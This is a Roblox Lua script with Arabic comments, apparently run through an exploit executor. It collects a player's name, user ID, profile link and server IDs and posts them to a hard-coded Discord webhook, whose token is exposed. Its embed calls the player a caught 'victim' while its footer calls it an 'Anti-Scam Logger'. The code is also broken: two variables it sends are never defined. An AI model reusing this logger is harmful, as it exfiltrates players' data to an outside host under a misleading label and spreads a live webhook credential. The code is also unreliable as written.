local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- حساب عمر الحساب بالأيام تقريباً

local displayName = player.DisplayName
local userId = player.UserId
local jobId = game.JobId ~= "" and game.JobId or "Main Server/Private"
local placeId = game.PlaceId
local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"

-- تجهيز البيانات لإرسالها بتنسيق مرتب (Embed) عبر الويب هوك
local data = {
    ["embeds"] = {
        {
            ["title"] = "🚨 تم صيد ضحية جديدة!",
            ["color"] = 16711680, -- لون أحمر
            ["fields"] = {
                { ["name"] = "👤 اسم المستخدم", ["value"] = "```" .. username .. "```", ["inline"] = true },
                { ["name"] = "🏷️ الاسم الظاهر", ["value"] = "```" .. displayName .. "```", ["inline"] = true },
                { ["name"] = "🆔 الأيدي (UserId)", ["value"] = "```" .. tostring(userId) .. "```", ["inline"] = true },
                { ["name"] = "📅 عمر الحساب", ["value"] = "```" .. accountAgeDays .. " يوم```", ["inline"] = true },
                { ["name"] = "🌐 رابط الحساب", ["value"] = "[اضغط هنا لفتح البروفايل](" .. profileUrl .. ")", ["inline"] = false },
                { ["name"] = "🌍 معرّف السيرفر (JobId)", ["value"] = "```" .. jobId .. "```", ["inline"] = false },
                { ["name"] = "🎮 معرّف اللعبة (PlaceId)", ["value"] = "```" .. tostring(placeId) .. "```", ["inline"] = true }
            },
            ["footer"] = {
                ["text"] = "Anti-Scam Logger"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

local encodedData = HttpService:JSONEncode(data)

-- رابط الويب هوك الخاص بك
local webhookUrl = "https://discord.com/api/webhooks/1554869958788255744/FUBoZaU9QRcXASVvcEfpUvEPfvA71btLuIK3axMwaFdpN6K_b_fDTEEAqcVynSoLj85S"

-- إرسال الطلب عبر الويب هوك (يتطلب محاكي يدعم HttpPost مثل Synapse Z أو Arceus X)
local success, errorMessage = pcall(function()
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = encodedData
    })
end)

if not success then
    -- محاولة بديلة في حال لم تكن دالة request مدعومة بالكامل
    pcall(function()
        HttpService:PostAsync(webhookUrl, encodedData)
    end)
end
